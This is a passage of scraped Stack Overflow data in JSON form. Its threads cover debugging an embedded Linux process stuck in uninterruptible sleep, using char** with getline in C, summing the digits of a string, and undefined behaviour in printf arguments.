embedded one, running Busybox (a very cut-down Linux with limited functionality) so we don&#39;t have strace or GDB and adding them could be a major overhead."}, {"owner": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "edited": false, "score": 0, "creation_date": 1449665951, "post_id": 34178684, "comment_id": 56105038, "body": "Alternatively you can use log prints in your process to check whether you are stack in a place you think."}, {"owner": {"reputation": 14928, "user_id": 360695, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d2c44123afa326f8088914089161248e?s=128&d=identicon&r=PG", "display_name": "Dummy00001", "link": "https://stackoverflow.com/users/360695/dummy00001"}, "edited": false, "score": 0, "creation_date": 1449677142, "post_id": 34178684, "comment_id": 56113116, "body": "Stuck in <code>D</code> to me associated with application being stuck in kernel, often due to kernel/device driver bug. Check the kernel log (<code>dmesg</code>). Use <code>top</code> to check on memory leaks/CPU usage of the software.  Both <code>top</code> and <code>dmesg</code> are available in the BB."}, {"owner": {"reputation": 2597, "user_id": 1389218, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/XZKfz.png?s=128&g=1", "display_name": "John U", "link": "https://stackoverflow.com/users/1389218/john-u"}, "edited": false, "score": 0, "creation_date": 1449825677, "post_id": 34178684, "comment_id": 56184016, "body": "Top shows the processes at 0% CPU, 0 memory (see edits to question above) and dmesg shows no errors."}], "answers": [{"comments": [{"owner": {"reputation": 1706, "user_id": 200509, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5c1a14b44dbd1ef2af0e264b6417333c?s=128&d=identicon&r=PG", "display_name": "eMPee584", "link": "https://stackoverflow.com/users/200509/empee584"}, "edited": false, "score": 1, "creation_date": 1596999250, "post_id": 35890912, "comment_id": 111985135, "body": ".. ah there&#39;s a good one, thanks! gonna mention it to <a href=\"https://github.com/scarfboy/straceD\" rel=\"nofollow noreferrer\">github.com/scarfboy/straceD</a> .."}], "tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 10, "last_activity_date": 1457524488, "last_edit_date": 1592644375, "creation_date": 1457524488, "answer_id": 35890912, "question_id": 34178684, "link": "https://stackoverflow.com/questions/34178684/diagnosing-process-stuck-in-d-state-uninterruptable-sleep-blocked-io/35890912#35890912", "title": "Diagnosing process stuck in D state (uninterruptable sleep / blocked IO)", "body": "<p>From the <a href=\"https://www.kernel.org/doc/Documentation/sysrq.txt\" rel=\"noreferrer\">Documentation for sysrq</a>:</p>\n<blockquote>\n<p>'w'   - Dumps tasks that are in uninterruptable (blocked) state.</p>\n</blockquote>\n<hr />\n<pre><code>echo w &gt;/proc/sysrq-trigger\n</code></pre>\n<p>shows extensive information about the blocked task(s) on the console (should also be viewable through <code>dmesg</code>); in particular the kernel stack trace is helpful for illuminating the issue.</p>\n"}], "owner": {"reputation": 2597, "user_id": 1389218, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/XZKfz.png?s=128&g=1", "display_name": "John U", "link": "https://stackoverflow.com/users/1389218/john-u"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4785, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1555964219, "creation_date": 1449663639, "last_edit_date": 1449999077, "question_id": 34178684, "link": "https://stackoverflow.com/questions/34178684/diagnosing-process-stuck-in-d-state-uninterruptable-sleep-blocked-io", "title": "Diagnosing process stuck in D state (uninterruptable sleep / blocked IO)", "body": "<p>We are working on an embedded Linux system using Live555 WIS-Streamer to stream video over RTSP over a network.</p>\n\n<p>On one particular system we see WIS-Streamer get stuck in an TASK_UNINTERRUPTIBLE state;\nFrom the command line: the <code>ps</code> status for the process is shown as <code>DW</code>, children of the WIS-process are all listed as <code>Z</code>ombie state.</p>\n\n<p>It looks like there's nothing we can do once we're in this state, other than reboot (not desirable). However, we'd really like to get to the root cause of this - I suspect that within the streamer it's hanging on a blocking <code>send</code> call or somesuch.\nIs there anything we can do, either in the code or via the command line etc. to try and narrow down what's blocked?</p>\n\n<p>As an example, I've tried looking at the output of netstat (<code>netstat -alp</code>) to see if there are dangling sockets attached to the PID of the blocked / zombie thread but to no avail.</p>\n\n<p><strong>Update with more info:</strong></p>\n\n<p>It's not thrashing the CPU, <code>top</code> lists blocked &amp; zombie threads as 0% mem / 0% CPU / VSZ 0.</p>\n\n<p>Further things I've tried poking about the system:</p>\n\n<p><strong>/proc/status/ for main &amp; child threads</strong> 546 is the parent, which is blocked:</p>\n\n<pre><code>$&gt; cat /proc/546/stat    \nName:   wis-streamer\nState:  D (disk sleep)\nTgid:   546\nPid:    546\nPPid:   1\nTracerPid:      0\nUid:    0       0       0       0\nGid:    0       0       0       0\nFDSize: 0\nGroups: \nThreads:        1\nSigQ:   17/353\nSigPnd: 0000000000000000\nShdPnd: 0000000000004102\nSigBlk: 0000000000000000\nSigIgn: 0000000000001004\nSigCgt: 0000000180006a02\nCapInh: 0000000000000000\nCapPrm: ffffffffffffffff\nCapEff: ffffffffffffffff\nCapBnd: ffffffffffffffff\nCpus_allowed:   1\nCpus_allowed_list:      0\nvoluntary_ctxt_switches:        997329\nnonvoluntary_ctxt_switches:     2428751\n</code></pre>\n\n<p><strong>Children</strong>:</p>\n\n<pre><code>Name:   wis-streamer\nState:  Z (zombie)\nTgid:   581\nPid:    581\nPPid:   546\nTracerPid:      0\nUid:    0       0       0       0\nGid:    0       0       0       0\nFDSize: 0\nGroups: \nThreads:        1\nSigQ:   17/353\nSigPnd: 0000000000000000\nShdPnd: 0000000000000102\nSigBlk: 0000000000000000\nSigIgn: 0000000000001004\nSigCgt: 0000000180006a02\nCapInh: 0000000000000000\nCapPrm: ffffffffffffffff\nCapEff: ffffffffffffffff\nCapBnd: ffffffffffffffff\nCpus_allowed:   1\nCpus_allowed_list:      0\nvoluntary_ctxt_switches:        856676\nnonvoluntary_ctxt_switches:     15626\n\nName:   wis-streamer\nState:  Z (zombie)\nTgid:   582\nPid:    582\nPPid:   546\nTracerPid:      0\nUid:    0       0       0       0\nGid:    0       0       0       0\nFDSize: 0\nGroups: \nThreads:        1\nSigQ:   17/353\nSigPnd: 0000000000000000\nShdPnd: 0000000000000102\nSigBlk: 0000000000000000\nSigIgn: 0000000000001004\nSigCgt: 0000000180006a02\nCapInh: 0000000000000000\nCapPrm: ffffffffffffffff\nCapEff: ffffffffffffffff\nCapBnd: ffffffffffffffff\nCpus_allowed:   1\nCpus_allowed_list:      0\nvoluntary_ctxt_switches:        856441\nnonvoluntary_ctxt_switches:     15694\n\n\nName:   wis-streamer\nState:  Z (zombie)\nTgid:   583\nPid:    583\nPPid:   546\nTracerPid:      0\nUid:    0       0       0       0\nGid:    0       0       0       0\nFDSize: 0\nGroups: \nThreads:        1\nSigQ:   17/353\nSigPnd: 0000000000000000\nShdPnd: 0000000000000102\nSigBlk: 0000000000000000\nSigIgn: 0000000000001004\nSigCgt: 0000000180006a02\nCapInh: 0000000000000000\nCapPrm: ffffffffffffffff\nCapEff: ffffffffffffffff\nCapBnd: ffffffffffffffff\nCpus_allowed:   1\nCpus_allowed_list:      0\nvoluntary_ctxt_switches:        856422\nnonvoluntary_ctxt_switches:     15837\n\n\nName:   wis-streamer\nState:  Z (zombie)\nTgid:   584\nPid:    584\nPPid:   546\nTracerPid:      0\nUid:    0       0       0       0\nGid:    0       0       0       0\nFDSize: 0\nGroups: \nThreads:        1\nSigQ:   17/353\nSigPnd: 0000000000000000\nShdPnd: 0000000000000102\nSigBlk: 0000000000000000\nSigIgn: 0000000000001004\nSigCgt: 0000000180006a02\nCapInh: 0000000000000000\nCapPrm: ffffffffffffffff\nCapEff: ffffffffffffffff\nCapBnd: ffffffffffffffff\nCpus_allowed:   1\nCpus_allowed_list:      0\nvoluntary_ctxt_switches:        856339\nnonvoluntary_ctxt_switches:     15500\n</code></pre>\n\n<p>Other things from <code>/proc/</code> filesys:</p>\n\n<pre><code>$&gt; cat /proc/546/personality\n00c00000\n$&gt; cat /proc/546/stat\n546 (wis-streamer) D 1 453 453 0 -1 4194564 391 0 135 0 140098 232409 0 0 20 0 1 0 1094 0 0 4294967295 0 0 0 0 0 0 0 4100 27138 3223605768 0 0 17 0 0 0 0 0 0\n</code></pre>\n\n<p><strong>Update upon update:</strong></p>\n\n<p>I have a feeling that a SysV-IPC message queue or semaphore call around such may be hanging - our system is held together by inter-process message queues (at least 40% Not Invented Here, written by Elbonian Code Slaves as part of a horrible horrible SDK) which can trap the unwary. I have re-jigged a couple of semaphore get/release routines which I suspect were less than fully wateright (in fact probably only just squirrel-proof) and will keep an eye on things - unfortunately it takes on average 12 hours running on a very particular test setup to induce this failure.</p>\n"}, {"tags": ["c", "char", "getline"], "answers": [{"tags": [], "owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "is_accepted": false, "score": 0, "last_activity_date": 1449663947, "creation_date": 1449663947, "answer_id": 34178799, "question_id": 34178648, "link": "https://stackoverflow.com/questions/34178648/proper-use-of-char/34178799#34178799", "title": "Proper use of Char**", "body": "<p>In the case of <code>getline</code> it requires the memory address at which to store the memory address of the first character in the line you've read.</p>\n\n<p>I.e. it needs a pointer to a pointer or a <code>char**</code>.</p>\n\n<p>Your string will be stored in <code>*string</code>.</p>\n\n<p>Of course you can get this information from the <a href=\"http://man7.org/linux/man-pages/man3/getline.3.html\" rel=\"nofollow\">documentation</a> :).</p>\n"}, {"tags": [], "owner": {"reputation": 6235, "user_id": 622060, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/59aeda6ad8dea5965841953391441d7d?s=128&d=identicon&r=PG", "display_name": "Per Johansson", "link": "https://stackoverflow.com/users/622060/per-johansson"}, "is_accepted": false, "score": 1, "last_activity_date": 1449664934, "creation_date": 1449664934, "answer_id": 34179107, "question_id": 34178648, "link": "https://stackoverflow.com/questions/34178648/proper-use-of-char/34179107#34179107", "title": "Proper use of Char**", "body": "<p>Almost always when a function asks for a <code>char**</code> or a <code>**</code> in general, you're expected to give it the address of a pointer variable. In this case the address of a <code>char*</code>. The address of operator is <code>&amp;</code>, thus you should call <code>getline</code> like this:</p>\n\n<pre><code>char *string = NULL;\nsize_t size = 0;\nwhile ((bytes_read = getline(&amp;string, &amp;fsize, fp))&gt;0) {\n    // use string here...\n}\nfree(string);\n</code></pre>\n\n<p>There are of course exceptions to the rule of <code>**</code> functions wanting an address of, but <code>getline</code> isn't one of them.</p>\n"}], "owner": {"reputation": 31, "user_id": 5659038, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/ff7c7d08b29bb8b07b512960bd14c177?s=128&d=identicon&r=PG&f=1", "display_name": "Becher", "link": "https://stackoverflow.com/users/5659038/becher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 601, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449668735, "creation_date": 1449663558, "last_edit_date": 1449664556, "question_id": 34178648, "link": "https://stackoverflow.com/questions/34178648/proper-use-of-char", "title": "Proper use of Char**", "body": "<p>I am new to C and came across a Char**, for example in the getline function. I have found several topics regarding this type but none of it explained how to actually use it. I understood the differences between Char[], Char* and Char**, but how can I access the content stored in a Char**?</p>\n\n<p>Could someone explain that to me? Thanks in advance!! :)</p>\n\n<p>So, for example i am trying to use the getline function to extract single lines from a file and to store them:</p>\n\n<pre><code>FILE *fp = fopen(myfile,\"r\");\nsize_t fsize;\nchar **string;\nssize_t bytes_read =0; \nwhile ((bytes_read = getline(string, &amp;fsize, fp))&gt;0) {\n// How to handle the content of string now? Is every line from the File stored in the Char** now?\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "pointers", "casting"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 3, "creation_date": 1449663156, "post_id": 34178451, "comment_id": 56103361, "body": "<code>1+2+3+4+5</code> is <code>15</code> not <code>14</code> , for starters ."}], "answers": [{"comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1449663651, "post_id": 34178544, "comment_id": 56103646, "body": "As for beginner , you should provide some explanation or comments for OP to understand it :-)"}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1449663785, "post_id": 34178544, "comment_id": 56103718, "body": "@ameyCU some one (which i thanks by the way) changed the instructions to this <code>sum += *a++ - &#39;0&#39;;</code> while it is elegant, it is not clear for a beginner."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1449664208, "post_id": 34178544, "comment_id": 56103991, "body": "@milevyo  I was referring for all over code . But yeah ,that could have been confusing ."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449672447, "post_id": 34178544, "comment_id": 56109564, "body": "@milevyo I don&#39;t agree that the edit was elegant, it made the code much harder to read and also dangerous, since mixing the <code>++</code> operator with other operators is bad practice. Your code with <code>a++</code> on a separate line is much better and safer, and that has nothing to do with it being more beginner-friendly. Furthermore, edits should not change coding style of posts. It was a bad edit, simple as that. I believe you always have the option to reject edits of your own posts."}], "tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": true, "score": 2, "last_activity_date": 1449663519, "last_edit_date": 1449663519, "creation_date": 1449663166, "answer_id": 34178544, "question_id": 34178451, "link": "https://stackoverflow.com/questions/34178451/how-to-add-the-numbers-present-in-a-string/34178544#34178544", "title": "How to add the numbers present in a string?", "body": "<pre><code>int sum = 0;\nchar *a = \"12345\";\n\nwhile (*a) {\n   sum += *a - '0';\n   a++;\n}\n\nprintf(\"sum=%d\\n\", sum);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "is_accepted": false, "score": 1, "last_activity_date": 1449676183, "creation_date": 1449676183, "answer_id": 34183109, "question_id": 34178451, "link": "https://stackoverflow.com/questions/34178451/how-to-add-the-numbers-present-in-a-string/34183109#34183109", "title": "How to add the numbers present in a string?", "body": "<p>I'd like to provide a pretty <strong>basic solution</strong> to this question..</p>\n\n<p>1)convert the given string to integer and store it's value into a variable, lets say <code>n</code> using the function <code>atoi()</code> function. know more about it by clicking <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm\" rel=\"nofollow\">THIS!</a>. and by the way <strong>it's pretty easy to understand, it just changes the string mentioned inside brackets to integer.</strong></p>\n\n<p>2)and then using a <code>for loop</code> calculate the sum.</p>\n\n<p>Here I have provided my solution to your problem, I don't think you'll have any problems in tracing out the code. If any help is required, feel free to comment :)</p>\n\n<p>Here's my code below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    int n,i,sum=0; //i is loop parameter and sum is used to store the sum of numbers\n    char *a=\"12345\";\n    n=atoi(a);  //atoi(string) function is used to change a string into integer \n    printf(\"%d\",n);\n\n    for(i=0;a[i]!='\\0';i++) //loop to calculate the sum\n    {\n        sum=sum+(n%10);\n        n=n/10;\n    }\n    printf(\"\\n\\nsum = %d\\n\\n\",sum);\n}\n</code></pre>\n\n<p>Hope it's helpful.</p>\n"}], "owner": {"reputation": 121, "user_id": 5237349, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/cP1ze.jpg?s=128&g=1", "display_name": "Durga Prasad", "link": "https://stackoverflow.com/users/5237349/durga-prasad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 1, "accepted_answer_id": 34178544, "answer_count": 2, "score": 0, "last_activity_date": 1449676183, "creation_date": 1449662810, "last_edit_date": 1449672642, "question_id": 34178451, "link": "https://stackoverflow.com/questions/34178451/how-to-add-the-numbers-present-in-a-string", "title": "How to add the numbers present in a string?", "body": "<pre><code>#include&lt;string.h&gt;\n#include&lt;stdio.h&gt;\nvoid main()\n{\n char *a=\"12345\";   //Add number of that string\n}\n</code></pre>\n\n<hr>\n\n<p>How can i add number of that string</p>\n\n<p><strong>example :</strong>  </p>\n\n<pre><code>sum=1+2+3+4+5\n\nsum=15\n</code></pre>\n\n<p>How can i do that?</p>\n"}, {"tags": ["c", "printf", "unsigned-char", "integer-promotion"], "comments": [{"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 5, "creation_date": 1449661989, "post_id": 34178147, "comment_id": 56102680, "body": "&quot;I also know that the sequence of operation inside printf is from the right.&quot; - yes, that&#39;s what you&#39;re likely to see but that&#39;s not something you should generally rely on. Technically the sequence here is undefined."}, {"owner": {"reputation": 5764, "user_id": 2003898, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/j2hnV.jpg?s=128&g=1", "display_name": "dhein", "link": "https://stackoverflow.com/users/2003898/dhein"}, "edited": false, "score": 3, "creation_date": 1449662023, "post_id": 34178147, "comment_id": 56102699, "body": "&quot; I also know that the sequence of operation inside printf is from the right.&quot; Than it is incorrect what you know."}, {"owner": {"reputation": 17910, "user_id": 3963067, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1e536542e9baa5c52499d61fb64f51d3?s=128&d=identicon&r=PG&f=1", "display_name": "gmoniava", "link": "https://stackoverflow.com/users/3963067/gmoniava"}, "edited": false, "score": 0, "creation_date": 1449662067, "post_id": 34178147, "comment_id": 56102727, "body": "Also <code>%x</code> expects <code>unsigned int</code> but you passed it <code>unsigned char</code>(<a href=\"http://stackoverflow.com/questions/27547377/format-specifier-for-unsigned-char\" title=\"format specifier for unsigned char\">stackoverflow.com/questions/27547377/&hellip;</a>)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1449662413, "post_id": 34178147, "comment_id": 56102919, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/949433/why-are-these-constructs-using-undefined-behavior\">Why are these constructs (using ++) undefined behavior?</a>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449662485, "post_id": 34178147, "comment_id": 56102951, "body": "People should be required to read the info page of the C-tag before asking."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449662546, "post_id": 34178147, "comment_id": 56102991, "body": "@hvd: It is UB by the standard. That&#39;s all to research for."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449662631, "post_id": 34178147, "comment_id": 56103040, "body": "Which &quot;number of bytes&quot; do you mean? There is no <code>sizeof</code>."}, {"owner": {"reputation": 88499, "user_id": 650405, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5cdee2abea51e91756076032f0053081?s=128&d=identicon&r=PG", "display_name": "Karoly Horvath", "link": "https://stackoverflow.com/users/650405/karoly-horvath"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449662736, "post_id": 34178147, "comment_id": 56103108, "body": "@Olaf: take a guess."}, {"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1449662826, "post_id": 34178147, "comment_id": 56103161, "body": "@hvd But you do usually get predictable repeatable results for this for a given environment. OP said &quot;from the right&quot;, i.e. right-to-left. I didn&#39;t think about it too hard but it looked correct, sorry if I got that wrong."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1449662870, "post_id": 34178147, "comment_id": 56103183, "body": "@Rup: <a href=\"http://stackoverflow.com/questions/949433/why-are-these-constructs-using-undefined-behavior\" title=\"why are these constructs using undefined behavior\">stackoverflow.com/questions/949433/&hellip;</a> And no, the compiler might (and will) very well swap evaluatio e.g. to optimise."}, {"owner": {"reputation": 88499, "user_id": 650405, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5cdee2abea51e91756076032f0053081?s=128&d=identicon&r=PG", "display_name": "Karoly Horvath", "link": "https://stackoverflow.com/users/650405/karoly-horvath"}, "reply_to_user": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1449662980, "post_id": 34178147, "comment_id": 56103250, "body": "@Rup: &quot;predictable repeatable results for this for a given environment&quot; - with UB, anything is allowed, including that. That doesn&#39;t mean that you should rely on it."}, {"owner": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "reply_to_user": {"reputation": 88499, "user_id": 650405, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5cdee2abea51e91756076032f0053081?s=128&d=identicon&r=PG", "display_name": "Karoly Horvath", "link": "https://stackoverflow.com/users/650405/karoly-horvath"}, "edited": false, "score": 0, "creation_date": 1449663041, "post_id": 34178147, "comment_id": 56103285, "body": "@KarolyHorvath Yes! As I said in my first comment."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1449663123, "post_id": 34178147, "comment_id": 56103342, "body": "@Rup: too violent. just another of those questions already linked in the <a href=\"http://stackoverflow.com/tags/c/info\">C info-page</a>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449663350, "post_id": 34178147, "comment_id": 56103476, "body": "You are asking two questions. Do not. Ask only one per posting."}, {"owner": {"reputation": 327, "user_id": 865439, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/b9dc00fa37e79c8b54d2508f75b32564?s=128&d=identicon&r=PG", "display_name": "Tattu", "link": "https://stackoverflow.com/users/865439/tattu"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449663388, "post_id": 34178147, "comment_id": 56103495, "body": "@Olaf, My question was specifically related to difference in printf(&quot;%x&quot;, a) and printf(&quot;%x&quot;, ~a). But I think I couldnt make that clear....  P.S: People make mistakes...."}, {"owner": {"user_type": "does_not_exist", "display_name": "user743382"}, "reply_to_user": {"reputation": 31408, "user_id": 243245, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/aed5c13647d581ae231f019a886e05a8?s=128&d=identicon&r=PG", "display_name": "Rup", "link": "https://stackoverflow.com/users/243245/rup"}, "edited": false, "score": 0, "creation_date": 1449663446, "post_id": 34178147, "comment_id": 56103534, "body": "@Rup Ah, thanks, I misread the question. I&#39;m sure it&#39;s still not just technically undefined, but I don&#39;t have a concrete test case to show that and don&#39;t think it&#39;s worth it trying to come up with one. :)"}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 2, "last_activity_date": 1449663053, "creation_date": 1449663053, "answer_id": 34178514, "question_id": 34178147, "link": "https://stackoverflow.com/questions/34178147/is-this-integer-promotion-how-does-it-work/34178514#34178514", "title": "Is this Integer Promotion? How does it work?", "body": "<p><code>printf(\"----&gt; %x %x %x %x\", ~a, a, ~a, ++a);</code> actually invokes undefined behavior because you have a side effect on <code>a</code> and other expressions depending on the same lvalue.  So anything can happen and it is hopeless to try and explain the output produced.</p>\n\n<p>Assuming 32 bit ints in 2's complement representation, if you wrote</p>\n\n<pre><code>printf(\"----&gt; %x %x %x %x\", ~a, a, ~a, a + 1);\n</code></pre>\n\n<p>You would get different and less surprising output:</p>\n\n<pre><code>ffffff01 fe ffffff01 ff\n</code></pre>\n\n<p>Let me explain what is going on:</p>\n\n<pre><code>a = ~a;\n</code></pre>\n\n<p><code>a</code> contains <code>1</code>, is converted to an <code>int</code> with the same value, the <code>~</code> operator applied to <code>1</code> computes to <code>-2</code>, converting that back to <code>unsigned char</code> gives 254 or <code>0xfe</code>.</p>\n\n<p>The arguments to <code>printf</code> are then computed as follows:</p>\n\n<ul>\n<li><p><code>~a</code>: 0xfe is converted to <code>int</code> and all bit are complemented, yielding <code>0xffffff01</code>.</p></li>\n<li><p><code>a</code> is converted to <code>int</code> with the same value and printed as <code>fe</code>.</p></li>\n<li><p><code>~a</code> again of course gives the same output.</p></li>\n<li><p><code>a+1</code>: <code>a</code> is converted to <code>int</code> before incrementing by one, result is 255, prints as <code>ff</code>.</p></li>\n</ul>\n\n<blockquote>\n  <p>The explanation for your surprising outputs is that <code>a</code> is <strong>first</strong> converted to <code>int</code> and then the computation is done on the <code>int</code> value.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": 